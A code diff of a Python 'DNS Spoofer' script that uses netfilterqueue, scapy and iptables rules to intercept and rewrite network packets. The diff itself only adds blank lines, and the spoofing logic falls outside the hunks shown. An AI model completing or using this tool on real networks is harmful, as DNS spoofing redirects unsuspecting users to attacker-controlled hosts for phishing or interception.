@@ -3,11 +3,13 @@ import netfilterqueue
 import scapy.all as scapy
 import sys, os, subprocess
 
+
 def root_check():
     if os.geteuid() != 0:
         sys.exit("[!] This script must run as root")
     else:
         print("[*] Welcome to the DNS Spoofer.")
+
 
 def iptable_insert():
     try:
@@ -27,6 +29,7 @@ def iptable_flush():
         print("[*] Iptables rules flushed")
     except Exception as e:
         print(f"[!] Error flushing iptables: {e}")
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -51,6 +54,7 @@ def process_packet(packet):
                 packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
+
 
 if __name__ == "__main__":
     root_check()
